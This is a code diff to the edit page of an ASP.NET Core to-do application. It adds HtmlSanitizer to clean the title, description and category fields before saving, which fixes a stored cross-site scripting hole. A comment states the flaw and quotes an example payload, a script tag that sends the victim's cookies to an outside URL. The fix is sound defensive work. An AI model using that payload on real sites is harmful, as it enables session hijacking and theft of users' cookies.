@@ -2,7 +2,7 @@
 using Microsoft.AspNetCore.Mvc.RazorPages;
 using Microsoft.EntityFrameworkCore;
 using ToDotNet.Models;
-
+using Ganss.Xss;
 namespace ToDotNet.Pages.Todos
 {
     public class EditModel : PageModel
@@ -36,15 +36,19 @@ namespace ToDotNet.Pages.Todos
 
         public async Task<IActionResult> OnPostAsync()
         {
-            //if (!ModelState.IsValid)
-            //{
-            //    return Page();
-            //}
-
+            
             _context.Attach(Todo).State = EntityState.Modified;
 
             try
             {
+                // Persistent XSS vulnerability!!!
+                // Example: <script>new Image().src="https://www.google.com.br/search?q="+document.cookie</script>
+
+                var sanitizer = new HtmlSanitizer();
+                Todo.Title = sanitizer.Sanitize(Todo.Title);
+                Todo.Description = sanitizer.Sanitize(Todo.Description);
+                Todo.Category = sanitizer.Sanitize(Todo.Category);
+
                 await _context.SaveChangesAsync();
             }
             catch (DbUpdateConcurrencyException)
